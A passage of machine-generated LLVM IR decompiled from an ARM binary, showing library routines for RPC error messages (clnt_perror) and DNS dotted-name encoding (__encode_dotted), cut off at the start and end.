  %v9_1bdac = load i32, i32* @r6, align 4
  %v12_1bdac = load i32, i32* @r7, align 4
  %v2_1bdb4 = ptrtoint i32* %stack_var_-1056 to i32
  %v0_1bdb8 = load i32, i32* @r0, align 4
  store i32 %v0_1bdb8, i32* @r4, align 4
  %v0_1bdbc = load i32, i32* @r1, align 4
  store i32 %v0_1bdbc, i32* @r5, align 4
  %v0_1bdc0 = call i32 @_buf()
  store i32 %v0_1bdc0, i32* @r7, align 4
  %v2_1bdc4 = icmp eq i32 %v0_1bdc0, 0
  br i1 %v2_1bdc4, label %dec_label_pc_1bf5c, label %dec_label_pc_1bdcc

dec_label_pc_1bdcc:                               ; preds = %entry
  %v0_1bdcc = load i32, i32* @r4, align 4
  %v1_1bdcc = add i32 %v0_1bdcc, 4
  %v2_1bdcc = inttoptr i32 %v1_1bdcc to i32*
  %v3_1bdcc = load i32, i32* %v2_1bdcc, align 4
  store i32 %v3_1bdcc, i32* %r3.global-to-local, align 4
  store i32 114144, i32* @lr, align 4
  %v1_1bddc = add i32 %v3_1bdcc, 8
  %v2_1bddc = inttoptr i32 %v1_1bddc to i32*
  %v3_1bddc = load i32, i32* %v2_1bddc, align 4
  call void @__pseudo_branch(i32 %v3_1bddc)
  %v0_1bde0 = load i32, i32* @r5, align 4
  %v0_1bde8 = load i32, i32* @r7, align 4
  store i32 %v0_1bde8, i32* @r0, align 4
  %v4_1bdec = call i32 @sprintf(i32 %v0_1bde8, i32 ptrtoint ([5 x i8]* @global_var_1eb54.1072 to i32), i32 %v0_1bde0)
  %v0_1bdf0 = load i32, i32* @r7, align 4
  %v2_1bdf0 = add i32 %v0_1bdf0, %v4_1bdec
  store i32 %v2_1bdf0, i32* @r4, align 4
  %v3_1bdf4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_1bdf4, i32* @r0, align 4
  %v0_1bdf8 = call i32 @__GI_clnt_sperrno()
  %v0_1be00 = load i32, i32* @r4, align 4
  %v2_1be04 = inttoptr i32 %v0_1bdf8 to i8*
  %v3_1be04 = call i32 @strcpy(i32 %v0_1be00, i8* %v2_1be04)
  %v0_1be08 = load i32, i32* @r4, align 4
  %v1_1be08 = inttoptr i32 %v0_1be08 to i8*
  %v3_1be0c = call i32 @strlen(i8* %v1_1be08)
  %v3_1be10 = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_1be10, i32* %r3.global-to-local, align 4
  %v0_1be14 = load i32, i32* @r4, align 4
  %v2_1be14 = add i32 %v0_1be14, %v3_1be0c
  store i32 %v2_1be14, i32* @r5, align 4
  switch i32 %v3_1be10, label %dec_label_pc_1bf34 [
    i32 0, label %dec_label_pc_1bf4c
    i32 1, label %dec_label_pc_1bf4c
    i32 2, label %dec_label_pc_1bf4c
    i32 3, label %dec_label_pc_1be6c
    i32 4, label %dec_label_pc_1be6c
    i32 5, label %dec_label_pc_1bf4c
    i32 6, label %dec_label_pc_1bf3c
    i32 7, label %dec_label_pc_1beac
    i32 8, label %dec_label_pc_1bf4c
    i32 9, label %dec_label_pc_1bf3c
    i32 10, label %dec_label_pc_1bf4c
    i32 11, label %dec_label_pc_1bf4c
    i32 12, label %dec_label_pc_1bf4c
    i32 13, label %dec_label_pc_1bf4c
    i32 14, label %dec_label_pc_1bf4c
    i32 15, label %dec_label_pc_1bf4c
    i32 16, label %dec_label_pc_1bf4c
    i32 17, label %dec_label_pc_1bf4c
  ]

dec_label_pc_1be6c:                               ; preds = %dec_label_pc_1bdcc, %dec_label_pc_1bdcc
  store i32 1024, i32* @r2, align 4
  store i32 %tmp13, i32* @r0, align 4
  %v3_1be78 = call i32 @__GI___glibc_strerror_r(i32 %tmp13, i32 %v2_1bdb4, i32 1024)
  %v0_1be80 = load i32, i32* @r5, align 4
  store i32 %v0_1be80, i32* @r0, align 4
  store i32 %v2_1bdb4, i32* @r4, align 4
  %v4_1be90 = call i32 @sprintf(i32 %v0_1be80, i32 ptrtoint ([13 x i8]* @global_var_1eb60.1079 to i32), i32 %v2_1bdb4)
  br label %dec_label_pc_1bf48

dec_label_pc_1be98:                               ; preds = %dec_label_pc_1beb8
  store i32 %v5_1beb8, i32* %r3.global-to-local, align 4
  %v1_1be9c = add i32 %v4_1beb8, add (i32 ptrtoint (i32* @global_var_1ebe0.1083 to i32), i32 4)
  %v2_1be9c = inttoptr i32 %v1_1be9c to i32*
  %v3_1be9c = load i32, i32* %v2_1be9c, align 4
  store i32 ptrtoint ([18 x i8]* @global_var_1ec20.1081 to i32), i32* %r3.global-to-local, align 4
  %v2_1bea4 = add i32 %v3_1be9c, ptrtoint ([18 x i8]* @global_var_1ec20.1081 to i32)
  br label %dec_label_pc_1bed8

dec_label_pc_1beac:                               ; preds = %dec_label_pc_1bdcc
  br label %dec_label_pc_1beb8

dec_label_pc_1beb8:                               ; preds = %dec_label_pc_1beac, %dec_label_pc_1bec4
  %v1_1be9825 = phi i32 [ 0, %dec_label_pc_1beac ], [ %v1_1bec4, %dec_label_pc_1bec4 ]
  %v4_1beb8 = mul i32 %v1_1be9825, 8
  %v5_1beb8 = add i32 %v4_1beb8, ptrtoint (i32* @global_var_1ebe0.1083 to i32)
  %v6_1beb8 = inttoptr i32 %v5_1beb8 to i32*
  %v7_1beb8 = load i32, i32* %v6_1beb8, align 4
  store i32 %v7_1beb8, i32* %r3.global-to-local, align 4
  %v9_1bebc = icmp eq i32 %v7_1beb8, %tmp13
  br i1 %v9_1bebc, label %dec_label_pc_1be98, label %dec_label_pc_1bec4

dec_label_pc_1bec4:                               ; preds = %dec_label_pc_1beb8
  %v1_1bec4 = add i32 %v1_1be9825, 1
  %tmp = icmp ult i32 %v1_1bec4, 8
  br i1 %tmp, label %dec_label_pc_1beb8, label %dec_label_pc_1bed8.loopexit

dec_label_pc_1bed8.loopexit:                      ; preds = %dec_label_pc_1bec4
  br label %dec_label_pc_1bed8

dec_label_pc_1bed8:                               ; preds = %dec_label_pc_1bed8.loopexit, %dec_label_pc_1be98
  %storemerge2 = phi i32 [ %v2_1bea4, %dec_label_pc_1be98 ], [ 0, %dec_label_pc_1bed8.loopexit ]
  store i32 %storemerge2, i32* @r6, align 4
  %v4_1bee0 = call i32 @strcpy(i32 %v2_1be14, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1eb98.1085, i32 0, i32 0))
  %v0_1bee4 = load i32, i32* @r5, align 4
  %v1_1bee4 = inttoptr i32 %v0_1bee4 to i8*
  %v3_1bee8 = call i32 @strlen(i8* %v1_1bee4)
  %v0_1beec = load i32, i32* @r6, align 4
  %v2_1beec = icmp eq i32 %v0_1beec, 0
  %v0_1bef0 = load i32, i32* @r5, align 4
  %v2_1bef0 = add i32 %v0_1bef0, %v3_1bee8
  store i32 %v2_1bef0, i32* @r4, align 4
  br i1 %v2_1beec, label %dec_label_pc_1bf10, label %dec_label_pc_1bef8

dec_label_pc_1bef8:                               ; preds = %dec_label_pc_1bed8
  %v2_1bf00 = inttoptr i32 %v0_1beec to i8*
  %v3_1bf00 = call i32 @strcpy(i32 %v2_1bef0, i8* %v2_1bf00)
  %v0_1bf04 = load i32, i32* @r4, align 4
  %v1_1bf04 = inttoptr i32 %v0_1bf04 to i8*
  %v3_1bf08 = call i32 @strlen(i8* %v1_1bf04)
  br label %dec_label_pc_1bf20

dec_label_pc_1bf10:                               ; preds = %dec_label_pc_1bed8
  store i32 %v2_1bef0, i32* @r0, align 4
  %v4_1bf1c = call i32 @sprintf(i32 %v2_1bef0, i32 ptrtoint ([36 x i8]* @global_var_1eba4.1087 to i32), i32 %tmp13)
  br label %dec_label_pc_1bf20

dec_label_pc_1bf20:                               ; preds = %dec_label_pc_1bef8, %dec_label_pc_1bf10
  %storemerge3 = phi i32 [ %v4_1bf1c, %dec_label_pc_1bf10 ], [ %v3_1bf08, %dec_label_pc_1bef8 ]
  %v0_1bf20 = load i32, i32* @r4, align 4
  %v2_1bf20 = add i32 %v0_1bf20, %storemerge3
  store i32 %v2_1bf20, i32* @r5, align 4
  br label %dec_label_pc_1bf4c

dec_label_pc_1bf34:                               ; preds = %dec_label_pc_1bdcc
  br label %dec_label_pc_1bf3c

dec_label_pc_1bf3c:                               ; preds = %dec_label_pc_1bdcc, %dec_label_pc_1bdcc, %dec_label_pc_1bf34
  %storemerge5 = phi i32 [ ptrtoint ([21 x i8]* @global_var_1ebc8.1091 to i32), %dec_label_pc_1bf34 ], [ ptrtoint ([40 x i8]* @global_var_1eb70.1089 to i32), %dec_label_pc_1bdcc ], [ ptrtoint ([40 x i8]* @global_var_1eb70.1089 to i32), %dec_label_pc_1bdcc ]
  store i32 %v2_1be14, i32* @r0, align 4
  %v3_1bf44 = call i32 @sprintf(i32 %v2_1be14, i32 %storemerge5, i32 %tmp13)
  br label %dec_label_pc_1bf48

dec_label_pc_1bf48:                               ; preds = %dec_label_pc_1be6c, %dec_label_pc_1bf3c
  %storemerge4 = phi i32 [ %v4_1be90, %dec_label_pc_1be6c ], [ %v3_1bf44, %dec_label_pc_1bf3c ]
  %v0_1bf48 = load i32, i32* @r5, align 4
  %v2_1bf48 = add i32 %v0_1bf48, %storemerge4
  store i32 %v2_1bf48, i32* @r5, align 4
  br label %dec_label_pc_1bf4c

dec_label_pc_1bf4c:                               ; preds = %dec_label_pc_1bdcc, %dec_label_pc_1bdcc, %dec_label_pc_1bdcc, %dec_label_pc_1bdcc, %dec_label_pc_1bdcc, %dec_label_pc_1bdcc, %dec_label_pc_1bdcc, %dec_label_pc_1bdcc, %dec_label_pc_1bdcc, %dec_label_pc_1bdcc, %dec_label_pc_1bdcc, %dec_label_pc_1bdcc, %dec_label_pc_1bdcc, %dec_label_pc_1bf20, %dec_label_pc_1bf48
  %v2_1bf50 = phi i32 [ %v2_1be14, %dec_label_pc_1bdcc ], [ %v2_1be14, %dec_label_pc_1bdcc ], [ %v2_1be14, %dec_label_pc_1bdcc ], [ %v2_1be14, %dec_label_pc_1bdcc ], [ %v2_1be14, %dec_label_pc_1bdcc ], [ %v2_1be14, %dec_label_pc_1bdcc ], [ %v2_1be14, %dec_label_pc_1bdcc ], [ %v2_1be14, %dec_label_pc_1bdcc ], [ %v2_1be14, %dec_label_pc_1bdcc ], [ %v2_1be14, %dec_label_pc_1bdcc ], [ %v2_1be14, %dec_label_pc_1bdcc ], [ %v2_1be14, %dec_label_pc_1bdcc ], [ %v2_1be14, %dec_label_pc_1bdcc ], [ %v2_1bf20, %dec_label_pc_1bf20 ], [ %v2_1bf48, %dec_label_pc_1bf48 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_1bf50 = add i32 %v2_1bf50, 1
  %v4_1bf50 = inttoptr i32 %v3_1bf50 to i8*
  store i8 0, i8* %v4_1bf50, align 1
  %v0_1bf54 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bf54 = add i32 %v0_1bf54, 10
  store i32 %v1_1bf54, i32* %r3.global-to-local, align 4
  %v1_1bf58 = trunc i32 %v1_1bf54 to i8
  %v2_1bf58 = load i32, i32* @r5, align 4
  %v3_1bf58 = inttoptr i32 %v2_1bf58 to i8*
  store i8 %v1_1bf58, i8* %v3_1bf58, align 1
  %v0_1bf5c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1bf5c

dec_label_pc_1bf5c:                               ; preds = %entry, %dec_label_pc_1bf4c
  %v0_1bf5c = phi i32 [ 0, %entry ], [ %v0_1bf5c.pre, %dec_label_pc_1bf4c ]
  store i32 %v3_1bdac, i32* @r4, align 4
  store i32 %v6_1bdac, i32* @r5, align 4
  store i32 %v9_1bdac, i32* @r6, align 4
  store i32 %v12_1bdac, i32* @r7, align 4
  ret i32 %v0_1bf5c

; uselistorder directives
  uselistorder i32 %v2_1bef0, { 2, 1, 0, 3 }
  uselistorder i32 %v5_1beb8, { 1, 0 }
  uselistorder i32 %v4_1beb8, { 1, 0 }
  uselistorder i32 %v1_1be9825, { 1, 0 }
  uselistorder i32 %v2_1be14, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16 }
  uselistorder i32 %v2_1bdb4, { 1, 0, 2 }
  uselistorder i32 %tmp13, { 4, 3, 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 0, 1, 2, 6, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_1ebe0.1083 to i32), { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__GI___glibc_strerror_r, { 2, 1, 0 }
  uselistorder i32 17, { 7, 0, 18, 1, 19, 16, 2, 12, 13, 14, 15, 3, 8, 4, 9, 5, 10, 6, 11, 20, 17 }
  uselistorder i32 14, { 1, 2, 4, 5, 6, 7, 0, 8, 9, 3 }
  uselistorder i32 13, { 2, 5, 6, 7, 0, 4, 3, 8, 1 }
  uselistorder i32 11, { 12, 19, 20, 7, 2, 17, 8, 27, 13, 14, 15, 21, 5, 6, 22, 23, 24, 25, 26, 1, 0, 3, 18, 9, 10, 4, 16, 11 }
  uselistorder i32 10, { 26, 20, 23, 4, 5, 29, 6, 7, 30, 31, 32, 33, 34, 25, 12, 24, 8, 35, 3, 36, 37, 38, 39, 10, 13, 2, 40, 14, 41, 15, 16, 17, 0, 27, 28, 18, 21, 22, 42, 9, 1, 11, 19 }
  uselistorder i32 9, { 9, 11, 12, 13, 14, 15, 4, 16, 10, 0, 5, 17, 3, 18, 19, 6, 24, 20, 21, 22, 23, 7, 2, 1, 8 }
  uselistorder i32 7, { 7, 5, 6, 15, 16, 12, 13, 2, 3, 8, 9, 10, 0, 14, 18, 17, 1, 4, 11 }
  uselistorder i32 5, { 18, 35, 2, 30, 31, 32, 21, 6, 7, 36, 37, 38, 10, 22, 23, 11, 0, 8, 12, 3, 20, 24, 4, 25, 26, 13, 27, 5, 9, 1, 33, 34, 19, 28, 29, 14, 15, 16, 17 }
  uselistorder i32 (i32, i8*)* @strcpy, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 ()* @__GI_clnt_sperrno, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @sprintf, { 2, 6, 5, 1, 4, 3, 0 }
  uselistorder i32* @r7, { 66, 5, 67, 68, 69, 70, 38, 39, 143, 145, 146, 144, 147, 148, 149, 150, 151, 152, 40, 41, 42, 43, 44, 45, 46, 3, 47, 48, 49, 50, 71, 72, 255, 249, 250, 251, 252, 253, 254, 200, 212, 213, 214, 223, 224, 225, 226, 153, 161, 160, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 215, 216, 217, 218, 219, 220, 221, 222, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 73, 74, 75, 256, 257, 258, 259, 13, 76, 0, 11, 227, 228, 229, 230, 231, 22, 23, 24, 25, 6, 1, 232, 233, 234, 235, 236, 247, 248, 77, 78, 79, 237, 238, 266, 80, 81, 82, 83, 4, 84, 85, 15, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 239, 240, 241, 242, 162, 243, 244, 245, 246, 163, 7, 164, 165, 8, 12, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 2, 26, 27, 262, 263, 264, 265, 166, 167, 168, 196, 197, 198, 199, 154, 155, 156, 157, 158, 159, 120, 121, 122, 123, 124, 105, 86, 87, 9, 88, 89, 260, 10, 261, 90, 91, 92, 93, 94, 95, 96, 97, 104, 137, 138, 28, 29, 30, 31, 32, 33, 133, 134, 135, 136, 34, 35, 36, 37, 129, 130, 131, 132, 125, 126, 127, 128, 98, 99, 100, 101, 102, 103, 106, 107, 108, 109, 139, 14, 140, 141, 142, 16, 17, 18, 19, 20, 21 }
  uselistorder label %dec_label_pc_1bf5c, { 1, 0 }
  uselistorder label %dec_label_pc_1bf4c, { 14, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_1bf48, { 1, 0 }
  uselistorder label %dec_label_pc_1bf3c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1bf20, { 1, 0 }
  uselistorder label %dec_label_pc_1beb8, { 1, 0 }
}

define i32 @clnt_perror(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1bf8c = load i32, i32* @lr, align 4
  %v0_1bf90 = call i32 @__GI_clnt_sperror()
  %v2_1bf98 = load i32, i32* @global_var_2b570, align 4
  store i32 %v0_1bf8c, i32* @lr, align 4
  %v2_1bfa0 = call i32 @__GI_fputs(i32 %v0_1bf90, i32 %v2_1bf98)
  %v0_1bfa4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1bfa4, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  ret i32 %v2_1bfa0

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fputs, { 5, 7, 6, 3, 1, 2, 0, 4 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1bfa8 = load i32, i32* @r4, align 4
  store i32 %v3_1bfa8, i32* %stack_var_-24, align 4
  %v6_1bfa8 = load i32, i32* @r5, align 4
  %v9_1bfa8 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_1bfb0 = load i32, i32* @r1, align 4
  store i32 %v0_1bfb0, i32* @r6, align 4
  %v0_1bfb4 = load i32, i32* @r2, align 4
  store i32 %v0_1bfb4, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1c01c19 = icmp slt i8* %arg1, null
  store i1 %v1_1c01c19, i1* %cpsr_n.global-to-local, align 1
  %v2_1c01c20 = icmp eq i8* %arg1, null
  store i1 %v2_1c01c20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c01c20, label %dec_label_pc_1c034, label %dec_label_pc_1c028

dec_label_pc_1bfc0:                               ; preds = %dec_label_pc_1c028
  %v2_1bfc0 = call i32 @__GI_strchr(i32 %v0_1bfc021, i32 46)
  store i32 %v2_1bfc0, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1bfc4 = icmp slt i32 %v2_1bfc0, 0
  store i1 %v1_1bfc4, i1* %cpsr_n.global-to-local, align 1
  %v2_1bfc4 = icmp eq i32 %v2_1bfc0, 0
  store i1 %v2_1bfc4, i1* %cpsr_z.global-to-local, align 1
  %v0_1bfc8 = load i32, i32* @r4, align 4
  %v2_1bfc8 = sub i32 %v2_1bfc0, %v0_1bfc8
  store i32 %v2_1bfc8, i32* %ip.global-to-local, align 4
  store i32 %v0_1bfc8, i32* %r0.global-to-local, align 4
  br i1 %v2_1bfc4, label %dec_label_pc_1bfd4, label %dec_label_pc_1bfdc

dec_label_pc_1bfd4:                               ; preds = %dec_label_pc_1bfc0
  %v1_1bfcc = inttoptr i32 %v0_1bfc8 to i8*
  %v3_1bfd4 = call i32 @strlen(i8* %v1_1bfcc)
  store i32 %v3_1bfd4, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_1bfd4, 16777216
  %v1_1bfd8 = sdiv i32 %sext, 16777216
  store i32 %v1_1bfd8, i32* %ip.global-to-local, align 4
  %v0_1bfe8.pre = load i32, i32* @r4, align 4
  %v0_1bff8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1bfdc

dec_label_pc_1bfdc:                               ; preds = %dec_label_pc_1bfc0, %dec_label_pc_1bfd4
  %v0_1bff8 = phi i32 [ %v2_1bfc0, %dec_label_pc_1bfc0 ], [ %v0_1bff8.pre, %dec_label_pc_1bfd4 ]
  %v0_1bfe8 = phi i32 [ %v0_1bfc8, %dec_label_pc_1bfc0 ], [ %v0_1bfe8.pre, %dec_label_pc_1bfd4 ]
  %v0_1c008 = phi i32 [ %v2_1bfc8, %dec_label_pc_1bfc0 ], [ %v1_1bfd8, %dec_label_pc_1bfd4 ]
  %v0_1bfdc = load i32, i32* %r7.global-to-local, align 4
  %v1_1bfdc = add i32 %v0_1bfdc, 1
  store i32 %v1_1bfdc, i32* @lr, align 4
  %v1_1bfe0 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bfe0 = sub i32 %v1_1bfe0, %v0_1bfdc
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1bfe4 = icmp slt i32 %v0_1c008, 0
  store i1 %v1_1bfe4, i1* %cpsr_n.global-to-local, align 1
  %v2_1bfe4 = icmp eq i32 %v0_1c008, 0
  store i1 %v2_1bfe4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1bfe8, i32* @r1, align 4
  %v0_1bfec = load i32, i32* @r6, align 4
  %v2_1bfec = add i32 %v0_1bfec, %v1_1bfdc
  store i32 %v2_1bfec, i32* @r0, align 4
  store i32 %v0_1c008, i32* @r2, align 4
  %v1_1bff4 = add i32 %v2_1bfe0, -1
  %v1_1bff8 = add i32 %v0_1bff8, 1
  store i32 %v1_1bff8, i32* @r4, align 4
  br i1 %v2_1bfe4, label %.loopexit, label %dec_label_pc_1c000

dec_label_pc_1c000:                               ; preds = %dec_label_pc_1bfdc
  %v2_1c000 = sub i32 %v0_1c008, %v1_1bff4
  %v3_1c000 = icmp ult i32 %v0_1c008, %v1_1bff4
  %v4_1c000 = xor i32 %v1_1bff4, %v0_1c008
  %v5_1c000 = xor i32 %v2_1c000, %v0_1c008
  %v6_1c000 = and i32 %v5_1c000, %v4_1c000
  %v7_1c000 = icmp slt i32 %v6_1c000, 0
  store i1 %v7_1c000, i1* %cpsr_v.global-to-local, align 1
  %v8_1c000 = icmp slt i32 %v2_1c000, 0
  store i1 %v8_1c000, i1* %cpsr_n.global-to-local, align 1
  %v9_1c000 = icmp eq i32 %v0_1c008, %v1_1bff4
  store i1 %v9_1c000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1c000, label %dec_label_pc_1c008, label %.loopexit

dec_label_pc_1c008:                               ; preds = %dec_label_pc_1c000
  %v1_1c008 = trunc i32 %v0_1c008 to i8
  %v4_1c008 = add i32 %v0_1bfec, %v0_1bfdc
  %v5_1c008 = inttoptr i32 %v4_1c008 to i8*
  store i8 %v1_1c008, i8* %v5_1c008, align 1
  %v0_1c00c = load i32, i32* @lr, align 4
  %v1_1c00c = load i32, i32* %ip.global-to-local, align 4
  %v2_1c00c = add i32 %v1_1c00c, %v0_1c00c
  store i32 %v2_1c00c, i32* %r7.global-to-local, align 4
  %v0_1c010 = call i32 @memcpy()
  store i32 %v0_1c010, i32* %r0.global-to-local, align 4
  %v0_1c014 = load i32, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1c014 = icmp slt i32 %v0_1c014, 0
  store i1 %v1_1c014, i1* %cpsr_n.global-to-local, align 1
  %v2_1c014 = icmp eq i32 %v0_1c014, 0
  store i1 %v2_1c014, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c014, label %dec_label_pc_1c034, label %dec_label_pc_1c008.dec_label_pc_1c01c_crit_edge

dec_label_pc_1c008.dec_label_pc_1c01c_crit_edge:  ; preds = %dec_label_pc_1c008
  %v0_1c01c.pre = load i32, i32* @r4, align 4
  store i32 %v0_1c01c.pre, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1c01c = icmp slt i32 %v0_1c01c.pre, 0
  store i1 %v1_1c01c, i1* %cpsr_n.global-to-local, align 1
  %v2_1c01c = icmp eq i32 %v0_1c01c.pre, 0
  store i1 %v2_1c01c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c01c, label %dec_label_pc_1c034, label %dec_label_pc_1c028

dec_label_pc_1c028:                               ; preds = %entry, %dec_label_pc_1c008.dec_label_pc_1c01c_crit_edge
  %v0_1bfc021 = phi i32 [ %v0_1c01c.pre, %dec_label_pc_1c008.dec_label_pc_1c01c_crit_edge ], [ %tmp, %entry ]
  %v1_1c028 = inttoptr i32 %v0_1bfc021 to i8*
  %v2_1c028 = load i8, i8* %v1_1c028, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1c02c = icmp eq i8 %v2_1c028, 0
  store i1 %v2_1c02c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c02c, label %dec_label_pc_1c034, label %dec_label_pc_1bfc0

dec_label_pc_1c034:                               ; preds = %dec_label_pc_1c008.dec_label_pc_1c01c_crit_edge, %dec_label_pc_1c008, %dec_label_pc_1c028, %entry
  %v0_1c034 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1c034 = icmp slt i32 %v0_1c034, 0
  store i1 %v1_1c034, i1* %cpsr_n.global-to-local, align 1
  %v2_1c034 = icmp eq i32 %v0_1c034, 0
  store i1 %v2_1c034, i1* %cpsr_z.global-to-local, align 1
  %tmp16 = icmp slt i32 %v0_1c034, 1
  br i1 %tmp16, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_1c034
  %v5_1c03c = load i32, i32* %r7.global-to-local, align 4
  %v6_1c03c = add i32 %v5_1c03c, 1
  store i32 %v6_1c03c, i32* %r0.global-to-local, align 4
  %v7_1c040 = load i32, i32* @r6, align 4
  %v9_1c040 = add i32 %v7_1c040, %v5_1c03c
  %v10_1c040 = inttoptr i32 %v9_1c040 to i8*
  store i8 0, i8* %v10_1c040, align 1
  %v0_1c044.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1c044.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1c044.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_1c034, %bb
  %v2_1c044 = phi i1 [ %v2_1c044.pre, %bb ], [ false, %dec_label_pc_1c034 ]
  %v1_1c044 = phi i1 [ %v1_1c044.pre, %bb ], [ %v1_1c034, %dec_label_pc_1c034 ]
  %v0_1c044 = phi i1 [ %v0_1c044.pre, %bb ], [ %v2_1c034, %dec_label_pc_1c034 ]
  %v3_1c044 = xor i1 %v2_1c044, %v1_1c044
  %v4_1c044 = or i1 %v0_1c044, %v3_1c044
  br i1 %v4_1c044, label %.loopexit, label %bb18

bb18:                                             ; preds = %bb17
  %v7_1c044 = load i32, i32* %stack_var_-24, align 4
  store i32 %v7_1c044, i32* @r4, align 4
  store i32 %v6_1bfa8, i32* @r5, align 4
  store i32 %v9_1bfa8, i32* @r6, align 4
  %v25_1c044 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v25_1c044

.loopexit:                                        ; preds = %dec_label_pc_1c000, %dec_label_pc_1bfdc, %bb17
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1c04c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1c04c, i32* @r4, align 4
  store i32 %v6_1bfa8, i32* @r5, align 4
  store i32 %v9_1bfa8, i32* @r6, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_1c034, { 0, 2, 1 }
  uselistorder i32 %v0_1c01c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1c014, { 1, 0 }
  uselistorder i32 %v2_1c000, { 1, 0 }
  uselistorder i32 %v1_1bff4, { 2, 0, 3, 1 }
  uselistorder i32 %v0_1c008, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_1bfd8, { 1, 0 }
  uselistorder i32 %v0_1bfc8, { 0, 2, 1, 3 }
  uselistorder i1 %v2_1c01c20, { 1, 0 }
  uselistorder i32 %v9_1bfa8, { 1, 0 }
  uselistorder i32 %v6_1bfa8, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 7, 3, 8, 4, 6, 5, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i32 (i8*)* @strlen, { 7, 38, 37, 28, 35, 34, 33, 32, 31, 30, 29, 6, 5, 4, 2, 0, 1, 36, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 8, 9, 3 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0 }
  uselistorder i32 46, { 0, 4, 5, 2, 3, 1 }
  uselistorder label %.loopexit, { 2, 0, 1 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_1c034, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1c028, { 1, 0 }
  uselistorder label %dec_label_pc_1bfdc, { 1, 0 }
}

define i32 @__decode_dotted() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
